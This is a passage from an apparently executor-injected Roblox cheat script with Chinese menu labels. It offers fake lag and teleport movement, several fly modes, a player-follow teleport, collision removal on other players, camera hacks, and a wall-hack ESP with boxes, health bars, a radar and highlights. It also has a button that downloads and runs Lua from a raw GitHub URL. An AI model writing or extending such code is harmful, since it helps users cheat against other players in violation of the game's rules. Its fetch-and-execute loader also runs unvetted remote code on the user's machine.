TeleportEnabled = false,
TeleportDistance = 10,
}
local fakeLagRunning = false
local function FakeLag_DoTeleport()
local Character = game.Players.LocalPlayer.Character
if Character then
local Root = Character:FindFirstChild("HumanoidRootPart")
local Humanoid = Character:FindFirstChild("Humanoid")
if Root and Humanoid then
local MoveDir = Humanoid.MoveDirection
if MoveDir.Magnitude > 0 then
local Distance = math.random(FakeLag.TeleportDistance * 100) / 100
local RootCFrame = Root.CFrame
local TargetPos = RootCFrame.Position + MoveDir.Unit * Distance
local LookVector = RootCFrame.LookVector
Root.CFrame = CFrame.new(TargetPos, TargetPos + LookVector)
end
end
end
end
MiscBox:AddToggle("FakeLag_Enabled", { Text = "假延迟", Default = false }):OnChanged(function(v)
FakeLag.Enabled = v
if v and not fakeLagRunning then
fakeLagRunning = true
task.spawn(function()
while fakeLagRunning do
if FakeLag.Enabled then
local Character = game.Players.LocalPlayer.Character
if Character then
local Root = Character:FindFirstChild("HumanoidRootPart")
if Root then
Root.Anchored = true
task.wait(FakeLag.AnchoredDuration)
Root.Anchored = false
if FakeLag.TeleportEnabled then
FakeLag_DoTeleport()
end
end
end
end
task.wait(FakeLag.Interval)
end
end)
end
end)
MiscBox:AddSlider("FakeLag_Interval", { Text = "假延迟间隔", Default = 0.07, Min = 0.07, Max = 1, Rounding = 2 }):OnChanged(function(v)
FakeLag.Interval = v
end)
MiscBox:AddSlider("FakeLag_Anchored", { Text = "锚定时长", Default = 0.4, Min = 0.1, Max = 10, Rounding = 2 }):OnChanged(function(v)
FakeLag.AnchoredDuration = v
end)
MiscBox:AddToggle("FakeLag_Teleport", { Text = "假wifi瞬移", Default = false }):OnChanged(function(v)
FakeLag.TeleportEnabled = v
end)
MiscBox:AddSlider("FakeLag_TeleportDist", { Text = "瞬移距离", Default = 10, Min = 5, Max = 50, Rounding = 0 }):OnChanged(function(v)
FakeLag.TeleportDistance = v
end)

do
local FlyBox = Tabs.Main:AddRightGroupbox("飞行")
FlyBox:AddButton("XJW飞行", function()
safeLoad("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E8%87%AA%E5%88%B6%E8%84%9A%E6%9C%AC%E9%A3%9E%E8%A1%8C.lua")
end)

local flyEnabled = false
local flySpeed = 50
local flyMode = "飞行v2"
local flyTPInterval = 0.1
local flyConnection = nil
local flyTPAccum = 0
local flyLastPos = nil
local flyVertical = 0
local FLY_BV_NAME = "TXFlyBV"
local FLY_BG_NAME = "TXFlyBG"
local flyUIS = game:GetService("UserInputService")
local flyCam = workspace.CurrentCamera

local function FlyGetInput()
    local dir = Vector3.new()
    if flyUIS:IsKeyDown(Enum.KeyCode.W) then dir = dir + flyCam.CFrame.LookVector end
    if flyUIS:IsKeyDown(Enum.KeyCode.S) then dir = dir - flyCam.CFrame.LookVector end
    if flyUIS:IsKeyDown(Enum.KeyCode.A) then dir = dir - flyCam.CFrame.RightVector end
    if flyUIS:IsKeyDown(Enum.KeyCode.D) then dir = dir + flyCam.CFrame.RightVector end
    if flyUIS:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
    if flyUIS:IsKeyDown(Enum.KeyCode.LeftShift) then dir = dir - Vector3.new(0, 1, 0) end
    if dir.Magnitude > 0 then
        return dir.Unit, flySpeed
    end
    local hum = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if hum then
        local md = hum.MoveDirection
        if md.Magnitude > 0.01 then
            dir = md.Unit
        end
    end
    if flyVertical ~= 0 then
        dir = dir + Vector3.new(0, flyVertical, 0)
    end
    if dir.Magnitude > 0 then
        return dir.Unit, flySpeed
    end
    return nil, 0
end

local flyTouches = {}
local flyPrevTouches = {}
local flyGestureDelta = 0
local flyGestureConns = {}

local function flySetupGestures()
    if #flyGestureConns > 0 then return end
    table.insert(flyGestureConns, flyUIS.InputBegan:Connect(function(input, gpe)
        if input.UserInputType == Enum.UserInputType.Touch and not gpe then
            flyTouches[input] = input.Position
        end
    end))
    table.insert(flyGestureConns, flyUIS.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch and flyTouches[input] then
            flyTouches[input] = input.Position
        end
    end))
    table.insert(flyGestureConns, flyUIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            flyTouches[input] = nil
        end
    end))
end

local function flyClearGestures()
    for _, c in ipairs(flyGestureConns) do
        pcall(function() c:Disconnect() end)
    end
    flyGestureConns = {}
    flyTouches = {}
    flyPrevTouches = {}
    flyGestureDelta = 0
    flyVertical = 0
end

local function flyUpdateGesture()
    local n = 0
    for _ in pairs(flyTouches) do n = n + 1 end
    if n == 2 then
        local dy = 0
        local dx = 0
        for input, pos in pairs(flyTouches) do
            local prev = flyPrevTouches[input]
            if prev then
                dy = dy + (pos.Y - prev.Y)
                dx = dx + math.abs(pos.X - prev.X)
            end
        end
        if math.abs(dy) > dx * 1.2 then
            flyGestureDelta = flyGestureDelta + dy
        end
    else
        flyGestureDelta = 0
    end
    flyPrevTouches = {}
    for input, pos in pairs(flyTouches) do
        flyPrevTouches[input] = pos
    end
    flyVertical = math.clamp(-flyGestureDelta / 40, -1, 1)
    flyGestureDelta = flyGestureDelta * 0.9
end

local function FlyEnsureVectorMovers(hrp)
    local bv = hrp:FindFirstChild(FLY_BV_NAME)
    if not bv then
        bv = Instance.new("BodyVelocity")
        bv.Name = FLY_BV_NAME
        bv.MaxForce = Vector3.new(100000, 100000, 100000)
        bv.Parent = hrp
    end
    local bg = hrp:FindFirstChild(FLY_BG_NAME)
    if not bg then
        bg = Instance.new("BodyGyro")
        bg.Name = FLY_BG_NAME
        bg.MaxTorque = Vector3.new(100000, 100000, 100000)
        bg.Parent = hrp
    end
    return bv, bg
end

local function FlyApplyOrientation(hrp, pos, dir)
    if math.abs(dir.Y) > 0.95 then
        hrp.CFrame = CFrame.new(pos) * hrp.CFrame.Rotation
    else
        hrp.CFrame = CFrame.lookAt(pos, pos + dir)
    end
end

local function FlyStep(dt)
    local char = game.Players.LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then hum.PlatformStand = true end

    flyUpdateGesture()

    local dir, speed = FlyGetInput()

    if flyMode == "飞行v2" then
        if dir then
            local bv, bg = FlyEnsureVectorMovers(hrp)
            bv.Velocity = dir * speed
            bg.CFrame = flyCam.CFrame
        else
            local bv = hrp:FindFirstChild(FLY_BV_NAME)
            if bv then bv.Velocity = Vector3.new() end
        end
        return
    end

    if not flyLastPos then
        flyLastPos = hrp.Position
    elseif (hrp.Position - flyLastPos).Magnitude > 50 then
        flyLastPos = hrp.Position
    end

    if flyMode == "飞行v3" then
        if dir then
            flyLastPos = flyLastPos + dir * speed * dt
            FlyApplyOrientation(hrp, flyLastPos, dir)
        else
            hrp.CFrame = CFrame.new(flyLastPos) * hrp.CFrame.Rotation
        end
        hrp.Velocity = Vector3.new()
    elseif flyMode == "瞬移飞行" then
        local moved = false
        if dir then
            flyTPAccum = flyTPAccum + dt
            if flyTPAccum >= flyTPInterval then
                flyTPAccum = flyTPAccum - flyTPInterval
                flyLastPos = flyLastPos + dir * speed * flyTPInterval
                FlyApplyOrientation(hrp, flyLastPos, dir)
                moved = true
            end
        end
        if not moved then
            hrp.CFrame = CFrame.new(flyLastPos) * hrp.CFrame.Rotation
        end
        hrp.Velocity = Vector3.new()
    end
end

local function FlyEnable()
    if flyConnection then return end
    flyLastPos = nil
    flyConnection = game:GetService("RunService").RenderStepped:Connect(function(dt)
        pcall(FlyStep, dt)
    end)
    flySetupGestures()
end

local function FlyDisable()
    if flyConnection then
        flyConnection:Disconnect()
        flyConnection = nil
    end
    flyClearGestures()
    flyLastPos = nil
    local char = game.Players.LocalPlayer.Character
    if char then
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, v in ipairs(hrp:GetChildren()) do
                if (v:IsA("BodyVelocity") or v:IsA("BodyGyro")) and (v.Name == FLY_BV_NAME or v.Name == FLY_BG_NAME) then
                    v:Destroy()
                end
            end
        end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum.PlatformStand = false end
    end
end

local flyToggleEl = FlyBox:AddToggle("Fly_Enabled", { Text = "飞行", Default = false })
flyToggleEl:OnChanged(function(value)
    flyEnabled = value
    if value then
        FlyEnable()
    else
        FlyDisable()
    end
end)
FlyBox:AddDropdown("Fly_Mode", { Text = "飞行模式", Values = { "飞行v2", "飞行v3", "瞬移飞行" }, Default = "飞行v2" }):OnChanged(function(value)
    flyMode = value
    flyTPAccum = 0
    flyLastPos = nil
end)
FlyBox:AddSlider("Fly_Speed", { Text = "飞行速度", Min = 1, Max = 500, Default = 50, Rounding = 0 }):OnChanged(function(value)
    flySpeed = value
end)
FlyBox:AddSlider("Fly_TPInterval", { Text = "瞬移间隔", Min = 0.05, Max = 0.5, Default = 0.1, Rounding = 2 }):OnChanged(function(value)
    flyTPInterval = value
end)
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    character:WaitForChild("HumanoidRootPart")
    flyLastPos = nil
end)
end

local SpinBox = Tabs.Main:AddRightGroupbox("旋转")
local spinRunning = false
local spinSpeed = 10

SpinBox:AddInput("Spin_Speed", { Text = "旋转速度", Default = "10", Numeric = true }):OnChanged(function(text)
spinSpeed = tonumber(text) or 10
end)

SpinBox:AddToggle("Spin_Enabled", { Text = "旋转开关", Default = false }):OnChanged(function(state)
if state then
spinRunning = true
task.spawn(function()
local player = game.Players.LocalPlayer
while spinRunning do
task.wait()
local character = player.Character
if character then
local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
if humanoidRootPart then
humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
end
end
end
end)
else
spinRunning = false
end
end)

local antiflingRunning = false
MiscBox:AddToggle("Antifling_Enabled", { Text = "防甩飞", Default = false }):OnChanged(function(state)
if state then
antiflingRunning = true
task.spawn(function()
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
while antiflingRunning do
task.wait(0.3)
for _, player in ipairs(Players:GetPlayers()) do
if player ~= localPlayer and player.Character then
for _, part in ipairs(player.Character:GetDescendants()) do
if part:IsA("BasePart") then
part.CanCollide = false
end
end
end
end
end
end)
else
antiflingRunning = false
local Players = game:GetService("Players")
for _, player in ipairs(Players:GetPlayers()) do
if player.Character then
for _, part in ipairs(player.Character:GetDescendants()) do
if part:IsA("BasePart") then
part.CanCollide = true
end
end
end
end
end
end)

local FollowBox = Tabs.TP:AddRightGroupbox("跟随功能")
local followTarget = nil
local followForward = 5
local followSide = 0
local followHeight = 0
local followEnabled = false
local followRunning = false

local followDropdown = FollowBox:AddDropdown("Follow_Target", {
Text = "选择跟随目标",
Values = {},
Default = "",
Multi = false,
})
followDropdown:OnChanged(function(value)
followTarget = value
end)

FollowBox:AddButton("刷新玩家列表", function()
local names = {}
for _, player in ipairs(game.Players:GetPlayers()) do
if player ~= game.Players.LocalPlayer then
table.insert(names, player.Name)
end
end
followDropdown:SetValues(names)
end)

FollowBox:AddSlider("Follow_Forward", { Text = "前后距离", Default = 5, Min = -20, Max = 20, Rounding = 0 }):OnChanged(function(v)
followForward = v
end)
FollowBox:AddSlider("Follow_Side", { Text = "左右距离", Default = 0, Min = -20, Max = 20, Rounding = 0 }):OnChanged(function(v)
followSide = v
end)
FollowBox:AddSlider("Follow_Height", { Text = "上下高度", Default = 0, Min = -20, Max = 20, Rounding = 0 }):OnChanged(function(v)
followHeight = v
end)

FollowBox:AddToggle("Follow_Enabled", { Text = "跟随玩家", Default = false }):OnChanged(function(state)
followEnabled = state
if state then
followRunning = true
task.spawn(function()
local player = game.Players.LocalPlayer
local runService = game:GetService("RunService")
while followEnabled and followRunning do
if not followTarget then
task.wait(0.1)
else
local target = game.Players:FindFirstChild(followTarget)
local myCharacter = player.Character
if not target or not target.Character or not myCharacter then
task.wait(0.1)
else
local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
local myRoot = myCharacter:FindFirstChild("HumanoidRootPart")
if not targetRoot or not myRoot then
task.wait(0.1)
else
local newPosition = targetRoot.CFrame.Position
+ (targetRoot.CFrame.LookVector * -followForward)
+ (targetRoot.CFrame.RightVector * followSide)
+ (Vector3.new(0, followHeight, 0))
myRoot.CFrame = CFrame.new(newPosition) * CFrame.Angles(0, targetRoot.CFrame.LookVector.Y, 0)
runService.RenderStepped:Wait()
end
end
end
end
end)
else
followRunning = false
end
end)

local joinNotifyEnabled = false
MiscBox:AddToggle("JoinNotify_Enabled", { Text = "玩家进入通知", Default = false }):OnChanged(function(state)
joinNotifyEnabled = state
end)

game.Players.PlayerAdded:Connect(function(player)
if not joinNotifyEnabled then return end
local success, thumbnail = pcall(function()
return game:GetService("Players"):GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
end)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 250, 0, 50)
Frame.Position = UDim2.new(0.1, -125, 0.15, 0)
Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Frame.BorderSizePixel = 0
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame
if success then
local Avatar = Instance.new("ImageLabel")
Avatar.Parent = Frame
Avatar.Size = UDim2.new(0, 35, 0, 35)
Avatar.Position = UDim2.new(0, 8, 0.5, -17)
Avatar.Image = thumbnail
end
local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Size = UDim2.new(1, -50, 0, 20)
Title.Position = UDim2.new(0, 50, 0, 5)
Title.BackgroundTransparency = 1
Title.Text = "玩家进入"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
local Content = Instance.new("TextLabel")
Content.Parent = Frame
Content.Size = UDim2.new(1, -50, 0, 20)
Content.Position = UDim2.new(0, 50, 0, 27)
Content.BackgroundTransparency = 1
Content.Text = player.DisplayName .. " (@" .. player.Name .. ")"
Content.TextColor3 = Color3.fromRGB(180, 180, 180)
Content.Font = Enum.Font.SourceSans
Content.TextSize = 13
Content.TextXAlignment = Enum.TextXAlignment.Left
task.delay(5, function()
ScreenGui:Destroy()
end)
end)



do
local CamBox = Tabs.Visual:AddLeftGroupbox("视角功能")
local camFOVEnabled = false
local camFOVValue = 70
local camFaceLockOn = false
local camFaceLockConn = nil
local camOriginalMaxZoom = game.Players.LocalPlayer.CameraMaxZoomDistance

CamBox:AddToggle("Cam_FOV", { Text = "广角", Default = false }):OnChanged(function(v)
    camFOVEnabled = v
    if v then
        workspace.CurrentCamera.FieldOfView = camFOVValue
    else
        workspace.CurrentCamera.FieldOfView = 70
    end
end)
CamBox:AddSlider("Cam_FOVVal", { Text = "广角值", Min = 1, Max = 300, Default = 70, Rounding = 0 }):OnChanged(function(v)
    camFOVValue = v
    if camFOVEnabled then
        workspace.CurrentCamera.FieldOfView = v
    end
end)
CamBox:AddToggle("Cam_UnlimitedZoom", { Text = "视角无限放大", Default = false }):OnChanged(function(v)
    if v then
        game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
    else
        game.Players.LocalPlayer.CameraMaxZoomDistance = camOriginalMaxZoom or 400
    end
end)
CamBox:AddToggle("Cam_FaceLock", { Text = "人物视角锁定", Default = false }):OnChanged(function(v)
    camFaceLockOn = v
    if camFaceLockConn then
        camFaceLockConn:Disconnect()
        camFaceLockConn = nil
    end
    if v and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        camFaceLockConn = game:GetService("RunService").RenderStepped:Connect(function()
            local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
            local camLook = workspace.CurrentCamera.CFrame.LookVector
            hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + Vector3.new(camLook.X, 0, camLook.Z))
        end)
    end
end)
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    character:WaitForChild("HumanoidRootPart")
    if camFaceLockOn and not camFaceLockConn then
        camFaceLockConn = game:GetService("RunService").RenderStepped:Connect(function()
            local hrp = character.HumanoidRootPart
            local camLook = workspace.CurrentCamera.CFrame.LookVector
            hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + Vector3.new(camLook.X, 0, camLook.Z))
        end)
    end
end)
end

pcall(function()

local BSESPBox = Tabs.Visual:AddLeftGroupbox("ESP设置")

getgenv().BSESPConfig = getgenv().BSESPConfig or {
ESPEnabled = false,
ShowBox = false,
Show3DBox = false,
ShowHealth = false,
ShowName = false,
ShowDistance = false,
ShowTracer = false,
TeamCheck = false,
ShowSkeleton = false,
ShowRadar = false,
ShowPlayerCount = false,
ShowWeapon = false,
RainbowMode = false,
HighlightPlayers = false,
TracerColor = Color3.new(1, 0, 0),
SkeletonColor = Color3.new(0.2, 0.8, 1),
BoxColor = Color3.new(1, 1, 1),
Box3DColor = Color3.new(0, 1, 1),
HealthBarColor = Color3.new(0, 1, 0),
HealthTextColor = Color3.new(1, 1, 1),
NameColor = Color3.new(1, 1, 1),
DistanceColor = Color3.new(1, 1, 0),
WeaponColor = Color3.new(1, 0.5, 0),
ArrowColor = Color3.new(1, 0, 0),
FOVColor = Color3.new(1, 1, 1),
HighlightColor = Color3.new(1, 0, 0),
BoxThickness = 1,
TracerThickness = 1,
SkeletonThickness = 2,
FOVRadius = 100,
ArrowSize = 15,
}

local BSPlayers = game:GetService("Players")
local BSRunService = game:GetService("RunService")
local BSCamera = workspace.CurrentCamera
local BSLocalPlayer = BSPlayers.LocalPlayer
local BSESPComponents = {}
local BSHighlightInstances = {}
local BSRadarDrawings = {}

local function getBSRainbowColor(time)
local r = math.sin(time * 2) * 0.5 + 0.5
local g = math.sin(time * 3) * 0.5 + 0.5
local b = math.sin(time * 4) * 0.5 + 0.5
return Color3.new(r, g, b)
end

local function getBSCurrentColor(fixedColor)
if getgenv().BSESPConfig.RainbowMode then
return getBSRainbowColor(tick())
end
return fixedColor
end

local function initBSRadar()
local radarFrame = Drawing.new("Square")
radarFrame.Visible = false
radarFrame.Color = Color3.new(0, 0, 0)
radarFrame.Thickness = 2
radarFrame.Filled = true
radarFrame.Transparency = 0.5
radarFrame.Size = Vector2.new(200, 200)
local radarBorder = Drawing.new("Square")
radarBorder.Visible = false
radarBorder.Color = Color3.new(1, 1, 1)
radarBorder.Thickness = 2
radarBorder.Filled = false
radarBorder.Size = Vector2.new(200, 200)
local radarCrosshairV = Drawing.new("Line")
radarCrosshairV.Visible = false
radarCrosshairV.Color = Color3.new(0.5, 0.5, 0.5)
radarCrosshairV.Thickness = 1
local radarCrosshairH = Drawing.new("Line")
radarCrosshairH.Visible = false
radarCrosshairH.Color = Color3.new(0.5, 0.5, 0.5)
radarCrosshairH.Thickness = 1
local localPlayerDot = Drawing.new("Circle")
localPlayerDot.Visible = false
localPlayerDot.Color = Color3.new(0, 1, 0)
localPlayerDot.Radius = 4
localPlayerDot.Filled = true
BSRadarDrawings = {
frame = radarFrame,
border = radarBorder,
crosshairV = radarCrosshairV,
crosshairH = radarCrosshairH,
localPlayer = localPlayerDot,
players = {}
}
end
pcall(function() initBSRadar() end)

local BSplayerCountText
pcall(function() BSplayerCountText = Drawing.new("Text") end)
if BSplayerCountText then
BSplayerCountText.Visible = false
BSplayerCountText.Size = 20
BSplayerCountText.Font = Drawing.Fonts.Monospace
BSplayerCountText.Outline = true
BSplayerCountText.OutlineColor = Color3.new(0, 0, 0)
end

local BSfovCircle
pcall(function()
BSfovCircle = Drawing.new("Circle")
BSfovCircle.Thickness = 2
BSfovCircle.Filled = false
BSfovCircle.NumSides = 64
end)

local function updateBSRadar()
if not getgenv().BSESPConfig.ShowRadar or not getgenv().BSESPConfig.ESPEnabled then
for _, drawing in pairs(BSRadarDrawings) do
if typeof(drawing) == "table" and drawing.Visible ~= nil then
drawing.Visible = false
elseif typeof(drawing) == "table" then
for _, d in pairs(drawing) do
if d.Visible ~= nil then d.Visible = false end
end
end
end
return
end
local radarRadius = 100
local radarPos = Vector2.new(BSCamera.ViewportSize.X - 220, 20)
local center = radarPos + Vector2.new(radarRadius, radarRadius)
BSRadarDrawings.frame.Position = radarPos
BSRadarDrawings.frame.Visible = true
BSRadarDrawings.border.Position = radarPos
BSRadarDrawings.border.Visible = true
if getgenv().BSESPConfig.RainbowMode then
local rainbow = getBSRainbowColor(tick())
BSRadarDrawings.frame.Color = rainbow
BSRadarDrawings.border.Color = rainbow
end
BSRadarDrawings.crosshairV.From = Vector2.new(center.X, radarPos.Y)
BSRadarDrawings.crosshairV.To = Vector2.new(center.X, radarPos.Y + 200)
BSRadarDrawings.crosshairV.Visible = true
BSRadarDrawings.crosshairH.From = Vector2.new(radarPos.X, center.Y)
BSRadarDrawings.crosshairH.To = Vector2.new(radarPos.X + 200, center.Y)
BSRadarDrawings.crosshairH.Visible = true
BSRadarDrawings.localPlayer.Position = center
BSRadarDrawings.localPlayer.Visible = true
if getgenv().BSESPConfig.RainbowMode then
BSRadarDrawings.localPlayer.Color = getBSRainbowColor(tick())
end
for player, dot in pairs(BSRadarDrawings.players) do
if not BSPlayers:FindFirstChild(player.Name) or player == BSLocalPlayer then
dot:Remove()
BSRadarDrawings.players[player] = nil
end
end
if BSLocalPlayer.Character and BSLocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
local localPos = BSLocalPlayer.Character.HumanoidRootPart.Position
local localRot = BSLocalPlayer.Character.HumanoidRootPart.CFrame.LookVector
local localAngle = math.atan2(localRot.X, localRot.Z)
for _, player in pairs(BSPlayers:GetPlayers()) do
if player ~= BSLocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
local targetPos = player.Character.HumanoidRootPart.Position
local relativePos = targetPos - localPos
local rotatedX = relativePos.X * math.cos(-localAngle) - relativePos.Z * math.sin(-localAngle)
local rotatedZ = relativePos.X * math.sin(-localAngle) + relativePos.Z * math.cos(-localAngle)
local radarX = rotatedX * 0.5
local radarY = -rotatedZ * 0.5
local distance = math.sqrt(radarX^2 + radarY^2)
local clipped = false
if distance > radarRadius - 5 then
local scale = (radarRadius - 5) / distance
radarX = radarX * scale
radarY = radarY * scale
clipped = true
end
if not BSRadarDrawings.players[player] then
local dot = Drawing.new("Circle")
dot.Radius = clipped and 2 or 3
dot.Filled = true
dot.Thickness = 1
BSRadarDrawings.players[player] = dot
end
local dot = BSRadarDrawings.players[player]
dot.Position = center + Vector2.new(radarX, radarY)
dot.Visible = true
if getgenv().BSESPConfig.TeamCheck and player.Team == BSLocalPlayer.Team then
dot.Color = Color3.new(0, 1, 0)
dot.Radius = 3
else
dot.Color = getBSCurrentColor(Color3.new(1, 0, 0))
dot.Radius = clipped and 2 or 3
end
elseif BSRadarDrawings.players[player] then
BSRadarDrawings.players[player].Visible = false
end
end
end
end

local function updateBSHighlights()
for player, highlight in pairs(BSHighlightInstances) do
if not BSPlayers:FindFirstChild(player.Name) then
highlight:Destroy()
BSHighlightInstances[player] = nil
end
end
if not getgenv().BSESPConfig.HighlightPlayers or not getgenv().BSESPConfig.ESPEnabled then
for _, highlight in pairs(BSHighlightInstances) do
highlight:Destroy()
end
BSHighlightInstances = {}
return
end
for _, player in pairs(BSPlayers:GetPlayers()) do
if player ~= BSLocalPlayer and player.Character then
local shouldShow = true
if getgenv().BSESPConfig.TeamCheck and player.Team == BSLocalPlayer.Team then
shouldShow = false
end
if shouldShow then
if not BSHighlightInstances[player] then
local highlight = Instance.new("Highlight")
highlight.FillTransparency = 0.3
highlight.OutlineTransparency = 0
highlight.Parent = player.Character
BSHighlightInstances[player] = highlight
end
local highlight = BSHighlightInstances[player]
local color = getBSCurrentColor(getgenv().BSESPConfig.HighlightColor)
highlight.FillColor = color
highlight.OutlineColor = color
if highlight.Parent ~= player.Character then
highlight.Parent = player.Character
end
elseif BSHighlightInstances[player] then
BSHighlightInstances[player]:Destroy()
BSHighlightInstances[player] = nil
end
end
end
end

local function updateBSGlobalDrawings()
if getgenv().BSESPConfig.ESPEnabled and getgenv().BSESPConfig.ShowPlayerCount then
BSplayerCountText.Text = "在线玩家: " .. #BSPlayers:GetPlayers()
BSplayerCountText.Position = Vector2.new(BSCamera.ViewportSize.X / 2, 10)
BSplayerCountText.Visible = true
BSplayerCountText.Color = getBSCurrentColor(Color3.new(1, 1, 1))
else
BSplayerCountText.Visible = false
end
if getgenv().BSESPConfig.ESPEnabled and getgenv().BSESPConfig.ShowFOV then
BSfovCircle.Radius = getgenv().BSESPConfig.FOVRadius
BSfovCircle.Position = Vector2.new(BSCamera.ViewportSize.X / 2, BSCamera.ViewportSize.Y / 2)
BSfovCircle.Visible = true
BSfovCircle.Color = getBSCurrentColor(getgenv().BSESPConfig.FOVColor)
else
BSfovCircle.Visible = false
end
end

local function updateBSEntity(player)
local comps = BSESPComponents[player]
if not comps then return end
local box = comps.box
local box3D = comps.box3D
local healthBar = comps.healthBar
local healthBarBackground = comps.healthBarBackground
local healthText = comps.healthText
local nameText = comps.nameText
local distanceText = comps.distanceText
local weaponText = comps.weaponText
local tracer = comps.tracer
local arrow = comps.arrow
local skeletonLines = comps.skeletonLines
local smoothHealth = comps.smoothHealth
if not getgenv().BSESPConfig.ESPEnabled or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or not player.Character:FindFirstChild("Humanoid") or player == BSLocalPlayer then
box.Visible = false
for i = 1, 12 do box3D[i].Visible = false end
healthBar.Visible = false
healthBarBackground.Visible = false
healthText.Visible = false
nameText.Visible = false
distanceText.Visible = false
weaponText.Visible = false
tracer.Visible = false
arrow.Visible = false
for _, line in pairs(skeletonLines) do line.Visible = false end
return
end
if getgenv().BSESPConfig.TeamCheck and player.Team == BSLocalPlayer.Team then
box.Visible = false
for i = 1, 12 do box3D[i].Visible = false end
healthBar.Visible = false
healthBarBackground.Visible = false
healthText.Visible = false
nameText.Visible = false
distanceText.Visible = false
weaponText.Visible = false
tracer.Visible = false
arrow.Visible = false
for _, line in pairs(skeletonLines) do line.Visible = false end
return
end
local character = player.Character
local rootPart = character:FindFirstChild("HumanoidRootPart")
local humanoid = character:FindFirstChild("Humanoid")
if rootPart and humanoid and humanoid.Health > 0 then
local rootPos, onScreen = BSCamera:WorldToViewportPoint(rootPart.Position)
local headPos = BSCamera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 3, 0))
local legPos = BSCamera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0))
local weaponName = "无武器"
for _, tool in ipairs(character:GetChildren()) do
if tool:IsA("Tool") then weaponName = tool.Name break end
end
if getgenv().BSESPConfig.ShowBox and onScreen then
box.Size = Vector2.new(1000 / rootPos.Z, headPos.Y - legPos.Y)
box.Position = Vector2.new(rootPos.X - box.Size.X / 2, rootPos.Y - box.Size.Y / 2)
box.Visible = true
box.Color = getBSCurrentColor(getgenv().BSESPConfig.BoxColor)
box.Thickness = getgenv().BSESPConfig.BoxThickness
else
box.Visible = false
end
if getgenv().BSESPConfig.Show3DBox then
local size = Vector3.new(4, 6, 2)
local cf = rootPart.CFrame
local corners = {
cf * CFrame.new(-size.X/2, -size.Y/2, -size.Z/2),
cf * CFrame.new(size.X/2, -size.Y/2, -size.Z/2),
cf * CFrame.new(size.X/2, size.Y/2, -size.Z/2),
cf * CFrame.new(-size.X/2, size.Y/2, -size.Z/2),
cf * CFrame.new(-size.X/2, -size.Y/2, size.Z/2),
cf * CFrame.new(size.X/2, -size.Y/2, size.Z/2),
cf * CFrame.new(size.X/2, size.Y/2, size.Z/2),
cf * CFrame.new(-size.X/2, size.Y/2, size.Z/2)
}
local screenCorners = {}
local allOnScreen = true
for i, corner in ipairs(corners) do
local pos, visible = BSCamera:WorldToViewportPoint(corner.Position)
screenCorners[i] = Vector2.new(pos.X, pos.Y)
if not visible then allOnScreen = false end
end
local color = getBSCurrentColor(getgenv().BSESPConfig.Box3DColor)
local lines = {{1,2},{2,3},{3,4},{4,1},{5,6},{6,7},{7,8},{8,5},{1,5},{2,6},{3,7},{4,8}}
for i, line in ipairs(lines) do
box3D[i].From = screenCorners[line[1]]
box3D[i].To = screenCorners[line[2]]
box3D[i].Color = color
box3D[i].Thickness = getgenv().BSESPConfig.BoxThickness
box3D[i].Visible = true
end
else
for i = 1, 12 do box3D[i].Visible = false end
end
if getgenv().BSESPConfig.ShowHealth and onScreen then
local healthPercentage = humanoid.Health / humanoid.MaxHealth
local barWidth = 50
local barHeight = 5
local barX = headPos.X - barWidth / 2
local barY = headPos.Y - 20
healthBarBackground.Size = Vector2.new(barWidth, barHeight)
healthBarBackground.Position = Vector2.new(barX, barY)
healthBarBackground.Visible = true
smoothHealth = smoothHealth + (humanoid.Health - smoothHealth) * 0.1
local smoothHealthPercentage = smoothHealth / humanoid.MaxHealth
healthBar.Size = Vector2.new(barWidth * smoothHealthPercentage, barHeight)
healthBar.Position = Vector2.new(barX, barY)
if smoothHealthPercentage >= 0.8 then
healthBar.Color = Color3.new(0, 1, 0)
elseif smoothHealthPercentage >= 0.5 then
healthBar.Color = Color3.new(1, 1, 0)
elseif smoothHealthPercentage >= 0.2 then
healthBar.Color = Color3.new(1, 0.5, 0)
else
healthBar.Color = Color3.new(1, 0, 0)
end
healthBar.Visible = true
healthText.Position = Vector2.new(barX + barWidth + 5, barY - 5)
healthText.Text = math.floor(humanoid.Health) .. "/" .. math.floor(humanoid.MaxHealth)
healthText.Visible = true
